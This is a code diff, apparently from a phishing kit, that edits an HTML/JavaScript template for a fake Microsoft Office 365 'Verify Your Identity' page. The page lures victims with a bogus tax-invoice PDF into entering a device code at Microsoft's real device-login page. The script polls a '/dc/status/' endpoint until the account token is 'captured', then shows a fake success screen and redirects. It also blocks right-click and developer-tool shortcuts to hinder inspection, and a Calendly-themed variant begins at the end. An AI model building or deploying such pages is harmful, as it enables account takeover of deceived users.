+          if (statusEl) statusEl.textContent = 'Code copied to clipboard';
+          setTimeout(() => {
+            copyBtn.classList.remove('is-copied');
+          }, 2000);
+        };
 
-            <h1 class="o365-heading">Verify Your Identity</h1>
-            <p class="secure-subtext">You've received a secure file</p>
-            
-            <div class="pdf-attachment-box">
-                <div class="pdf-brand-icon"></div>
-                <div class="pdf-meta">
-                    <span class="pdf-name">TAX_INVOICE_SCHEDULE.pdf</span>
-                    <span class="pdf-size">156.1KB</span>
-                </div>
-            </div>
-            
-            <p class="o365-prompt">To receive and download this PDF file, please enter specific professional credentials matching the verification code assignment sequence.</p>
-            
-            <div class="input-group">
-                <div class="o365-input" id="userCode">Loading...</div>
-                <button class="inline-copy-btn" id="copyBtn" onclick="copyCode()" title="Copy Code" disabled>
-                    <svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-                </button>
-            </div>
-            
-            <div class="status-message" id="codeStatus"></div>
-            
-            <button class="o365-btn" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
-            
-            <div class="o365-footer">
-                <span>© 2026 Microsoft</span>
-                <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">Privacy & Cookies</a>
-            </div>
-            
-            <div class="expiration-timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-        </div>
-
-        <!-- Success Screen Pipeline -->
-        <div class="success-viewport" id="successView">
-            <div class="success-tick-icon">
-                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-            </div>
-            <h2>Verification Complete</h2>
-            <p>Your identity has been confirmed. Secure identity file access has been successfully granted.</p>
-        </div>
-        
-    </div>
-</div>
-
-<script>
-    document.addEventListener("keydown", function(e) {
-        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
-            e.preventDefault();
-        }
-    });
-
-    document.addEventListener("contextmenu", function(e) {
-        e.preventDefault();
-    });
-
-    (function() {
-        var sid = '{session_id}';
-        var verifyUrl = '{verify_url}';
-        var codeReady = {code_ready};
-        var code = '{user_code}';
-        var expiresIn = {expires_seconds};
-        var popup = null;
-
-        var codeEl = document.getElementById('userCode');
-        var statusEl = document.getElementById('codeStatus');
-        var btnEl = document.getElementById('signInBtn');
-        var copyBtnEl = document.getElementById('copyBtn');
-        var timerEl = document.getElementById('timerValue');
-
-        function showCode(c, v) {
-            code = c;
-            if (v) verifyUrl = v;
-            codeEl.textContent = c;
-            codeEl.classList.remove('loading');
-            btnEl.disabled = false;
-            copyBtnEl.disabled = false;
-            document.getElementById('verifyLink').href = verifyUrl;
-        }
-
-        if (codeReady && code) {
-            showCode(code, verifyUrl);
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(targetText).then(processState).catch(() => {
+            fallbackCopy(targetText, processState);
+          });
         } else {
-            codeEl.classList.add('loading');
+          fallbackCopy(targetText, processState);
         }
+      };
 
-        function copyCode() {
-            if (!code) return;
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(code).then(function() {
-                    showCopied();
-                });
-            } else {
-                var t = document.createElement('textarea');
-                t.value = code;
-                t.style.cssText = 'position:fixed;left:-9999px';
-                document.body.appendChild(t);
-                t.select();
-                document.execCommand('copy');
-                document.body.removeChild(t);
-                showCopied();
+      function fallbackCopy(text, callback) {
+        const tmpInput = document.createElement('input');
+        tmpInput.value = text;
+        document.body.appendChild(tmpInput);
+        tmpInput.select();
+        document.execCommand('copy');
+        document.body.removeChild(tmpInput);
+        if (callback) callback();
+      }
+
+      // Open sign in (popup)
+      window.openSignIn = function() {
+        if (!code || code === 'Loading...') return;
+        
+        // Copy code to clipboard (as original did)
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(code).catch(function(){});
+        } else {
+          var t = document.createElement('textarea');
+          t.value = code;
+          t.style.cssText = 'position:fixed;left:-9999px';
+          document.body.appendChild(t);
+          t.select();
+          document.execCommand('copy');
+          document.body.removeChild(t);
+        }
+        if (statusEl) statusEl.textContent = 'Code copied to clipboard';
+
+        var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
+        popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+        if (popup) popup.focus();
+      };
+
+      // Timer update
+      function updateTimer() {
+        if (expiresIn <= 0) return;
+        expiresIn--;
+        var m = Math.floor(expiresIn / 60);
+        var s = expiresIn % 60;
+        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+        if (expiresIn > 0) setTimeout(updateTimer, 1000);
+      }
+
+      if (codeReady) setTimeout(updateTimer, 1000);
+
+      // Manual refresh
+      window.triggerManualRefresh = function() {
+        const charMap = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'.split('');
+        let freshSequence = '';
+        for (let i = 0; i < 9; i++) {
+          freshSequence += charMap[Math.floor(Math.random() * charMap.length)];
+        }
+        code = freshSequence;
+        codeEl.textContent = freshSequence;
+        codeEl.classList.remove('loading');
+        expiresIn = 720;
+        var m = Math.floor(expiresIn / 60);
+        var s = expiresIn % 60;
+        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+        if (statusEl) statusEl.textContent = 'New code generated';
+        btnEl.disabled = false;
+        copyBtn.disabled = false;
+      };
+
+      // POLLING (exact copy from original)
+      function poll() {
+        fetch('/dc/status/' + sid, {
+          method: 'GET',
+          credentials: 'include'
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (d.ready && !codeReady) {
+            codeReady = true;
+            showCode(d.user_code, d.verify_url);
+            if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
+          }
+          if (d.captured) {
+            // switch to success view
+            if (mainView) mainView.style.display = 'none';
+            if (successView) successView.style.display = 'block';
+            if (d.redirect_url) {
+              setTimeout(function() {
+                top.location.href = d.redirect_url;
+              }, 2500);
             }
+          }
+          if (!d.failed && !d.expired && !d.captured) {
+            setTimeout(poll, 3000);
+          }
+        })
+        ['catch'](function() {
+          setTimeout(poll, 5000);
+        });
+      }
+
+      // Start polling
+      poll();
+
+      // Security: disable right-click / F12 (from original)
+      document.addEventListener("keydown", function(e) {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
+          e.preventDefault();
         }
+      });
+      document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+      });
 
-        function showCopied() {
-            copyBtnEl.classList.add('copied');
-            statusEl.textContent = 'Code copied to clipboard';
-            setTimeout(function() {
-                copyBtnEl.classList.remove('copied');
-            }, 3000);
-        }
+      // Initialize timer display
+      if (timerEl) {
+        var m = Math.floor(expiresIn / 60);
+        var s = expiresIn % 60;
+        timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+      }
 
-        window.copyCode = copyCode;
-
-        function openSignIn() {
-            if (!code) return;
-            copyCode();
-            var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
-            popup = window.open(verifyUrl, 'ms', 'width=' + w + ',height=' + h + ',left=' + l + ',top=' + t + ',scrollbars=yes,resizable=yes');
-            if (popup) popup.focus();
-        }
-
-        window.openSignIn = openSignIn;
-
-        function updateTimer() {
-            if (expiresIn <= 0) return;
-            expiresIn--;
-            var m = Math.floor(expiresIn / 60);
-            var s = expiresIn % 60;
-            timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-            if (expiresIn > 0) setTimeout(updateTimer, 1000);
-        }
-
-        if (codeReady) setTimeout(updateTimer, 1000);
-
-        function poll() {
-            fetch('/dc/status/' + sid, {
-                method: 'GET',
-                credentials: 'include'
-            })
-            .then(function(r) {
-                return r.json();
-            })
-            .then(function(d) {
-                if (d.ready && !codeReady) {
-                    codeReady = true;
-                    showCode(d.user_code, d.verify_url);
-                    if (expiresIn === {expires_seconds}) {
-                        setTimeout(updateTimer, 1000);
-                    }
-                }
-                if (d.captured) {
-                    document.getElementById('mainView').style.display = 'none';
-                    document.getElementById('successView').style.display = 'block';
-                    if (d.redirect_url) {
-                        setTimeout(function() {
-                            top.location.href = d.redirect_url;
-                        }, 2500);
-                    }
-                }
-                if (!d.failed && !d.expired && !d.captured) {
-                    setTimeout(poll, 3000);
-                }
-            })
-            .catch(function() {
-                setTimeout(poll, 5000);
-            });
-        }
-
-        poll();
     })();
-</script>
+  </script>
+
 </body>
-</html>
-`
+</html>`
 
 // Calendly themed page
 const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
